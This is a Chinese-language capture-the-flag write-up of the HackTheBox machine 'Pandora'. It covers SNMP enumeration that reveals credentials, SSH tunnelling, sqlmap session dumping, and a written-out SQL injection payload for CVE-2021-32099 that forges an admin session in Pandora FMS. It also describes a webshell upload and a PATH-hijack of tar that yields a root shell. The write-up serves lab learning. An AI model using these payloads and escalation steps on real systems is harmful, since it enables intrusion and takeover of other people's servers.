# Pandora

- 練習日期:   2026/05/15
- 考點:       snmp、ssh tunnel、CVE-2020-13851、CVE-2021-32099、相對路徑劫取

## snmp

這題蠻特別的，tcp 的服務其實掃不出甚麼有幫助的東西，於是，嘗試掃看看 udp 服務，發現 port 161 運行 snmp 服務：

```bash
sudo nmap -sU -top-ports 100 10.10.11.136
```

畢竟是唯一的線索，只好試著存取看看 snmp：

```bash
## 基本語法
## 如果發現一堆 iso.3.6.1.2.1.1.1.0 而不是 SNMPv2-MIB::sysDescr.0，需要去 /etc/snmp/snmp.conf 把 mibs 註解掉
snmpwalk -v 1 -c public 10.10.11.136 | tee snmp.log
## 批次版本，速度比較快
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp.log
```

這邊說明一下，snmp 的格式大概是長成下面這種樣子，格式為 `主機名稱::物件名稱.索引 = 資料型態: 資料內容`，其中，物件名稱是由 MIB 定義的，而索引則是用來區分同一個物件的不同實例，例如，hrSWRunName 就是用來表示正在運行的程式名稱，而 hrSWRunParameters 則是用來表示正在運行的程式參數。當然還有其他格式，這邊暫且忽略。

```txt
HOST-RESOURCES-MIB::hrSWRunName.934 = STRING: "sshd"
HOST-RESOURCES-MIB::hrSWRunParameters.934 = STRING: "-D"
```

可想而知，撈出來的檔案會非常的肥大，因此，這邊嘗試透過 python 來快速整理成方便閱讀的資訊：

```python
#!/usr/bin/env python3

import re
import sys
from collections import defaultdict
from dataclasses import dataclass


@dataclass
class Process:
    """Process read from SNMP"""
    pid: int
    proc: str
    args: str = ""

    def __str__(self) -> str:
        return f'{self.pid:04d} {self.proc} {self.args}'


with open(sys.argv[1]) as f:
    data = f.read()

processes = {}

for match in re.findall(r'HOST-RESOURCES-MIB::hrSWRunName\.(\d+) = STRING: "(.+)"', data):
    processes[match[0]] = Process(int(match[0]), match[1])

for match in re.findall(r'HOST-RESOURCES-MIB::hrSWRunParameters\.(\d+) = STRING: "(.+)"', data):
    processes[match[0]].args = match[1]

for p in processes.values():
    print(p)
```

然後你就會快樂地得到一組帳號密碼。

## ssh tunnel

透過前面的帳號密碼，我們可以登入 ssh，接著在 `/etc/apache2/sites-enabled/pandora.conf` 裡面發現 localhost 80 port 有運行一個服務，於是，我們就可以透過 ssh tunnel 把這個服務轉發到本地：

```bash
ssh -L 1080:localhost:80 "使用者名稱"@10.10.11
```

發現版本為 v7.0NG.742_FIX_PERL2020 的 CMS，具有 CVE-2020-13851 和 CVE-2021-32099 兩個漏洞。

## CVE-2021-32099

這個[漏洞](https://sploitus.com/exploit?id=100B9151-5B50-532E-BF69-74864F32DB02)是說 `/pandora_console/include/chart_generator.php?session_id=xxx` 有 sql injection 的漏洞，我們可以直接 sqlmap 來跑看看。其中，table tpassword_history 的密碼 hash 爆破不了，不過發現 table tsessions_php 可以取得 session id，於是，我們嘗試撈 session id 出來看看：

```bash
-D pandora -T tsessions_php --dump --where "data<>''"
```

撈出來之後，我們可以透過 wfuzz 嘗試登入看看：

```bash
wfuzz -u http://pandora.panda.htb:9001/pandora_console/ -b PHPSESSID=FUZZ -w sessions
```

然後就可以快樂登入拉~

### admin upload

同樣的，我們可以利用前面 CVE-2021-32099 來取得 admin 的 session id：

```bash
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=PayloadHere%27%20union%20select%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a => Pandora FMS Graph ( - )
## 原本長這樣
PayloadHere' union select '1','2','id_usuario|s:5:"admin";' -- a
```

拿到 session id 之後，我們可以直接登入 admin 的帳號，接著在 admin 的介面裡面上傳 webshell，上傳後，觀察檔案路徑，可以發現路徑是 base 64 encode 的編碼，decode 之後可以知道，websheel 路徑是 `/pandora_console/images/webshell.php`，之後就可以快樂的 reverse shell ㄌ。

## CVE-2020-13851

可以透過 ajax.php 來做 RCE，具體有遇到再說。

## tar 鑽進去

這題的提權是利用 tar 的相對路徑劫取漏洞。我們可以先用 `ltrace` 來解析 `pandora_backup` ，發現 `pandora_backup` 其實是對 tar 使用相對路徑。因此，我們可以 fake PATH 來讓 tar 執行我們自己寫的 shell，假設 shell 放在 `/dev/shm`：

```bash
## 確認系統路徑
echo $PATH
## 把 /dev/shm 放在前面
export PATH=/dev/shm:$PATH
## 確認系統路徑
echo $PATH
## 在 /dev/shm 下放自己寫的 shell
echo -e '#!/bin/bash\n\nbash' > /dev/shm/tar
chmod +x /dev/shm/tar
```

接著，大膽執行 `pandora_backup` 就可以得到 root shell 了。
